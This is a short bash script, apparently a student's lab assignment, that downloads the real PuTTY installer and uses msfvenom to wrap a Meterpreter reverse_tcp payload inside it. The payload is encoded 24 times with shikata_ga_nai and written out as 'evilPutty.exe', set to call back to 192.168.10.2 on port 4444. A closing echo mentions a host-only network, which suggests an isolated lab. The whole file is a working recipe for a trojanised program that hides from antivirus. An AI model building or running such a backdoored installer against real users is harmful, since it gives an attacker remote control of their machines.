#!/bin/bash
#  John Williams
#  105201054
#  Date: Fri. Oct. 12, 2018
#  Program: setup.sh

rm -f evilPutty.exe
./change_ip.sh -r

wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe

./change_ip.sh 192.168.10.2

msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -i 24 -k -x ./putty.exe LHOST=192.168.10.2 LPORT=4444 > evilPutty.exe

rm -f putty.exe

echo "Please move machine to host only here--->"
